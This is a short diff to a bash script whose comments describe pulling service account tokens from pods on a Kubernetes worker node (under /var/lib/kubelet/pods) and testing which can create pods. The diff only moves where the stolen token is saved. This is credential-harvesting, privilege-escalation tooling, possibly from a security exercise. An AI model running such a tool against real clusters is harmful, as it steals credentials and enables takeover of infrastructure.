@@ -1,8 +1,5 @@
 #!/bin/bash
 
-# Get the directory where this script is located
-SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-
 # Simple script to extract service account tokens from pods running on this worker node
 # and test which ones can create pods
 
@@ -14,7 +11,7 @@ echo "Scanning for privileged service account tokens..."
 echo ""
 
 # Clear any existing token.txt
-> "$SCRIPT_DIR/token.txt"
+> token.txt
 
 # Function to test if a token can create pods
 test_pod_creation() {
@@ -128,7 +125,7 @@ for pod_dir in /var/lib/kubelet/pods/*/; do
         echo "  Saving token to token.txt..."
         
         # Save the privileged token to token.txt
-        echo "$token" > "$SCRIPT_DIR/token.txt"
+        echo "$token" > token.txt
         
         echo "  ✓ Token saved to token.txt"
         echo ""
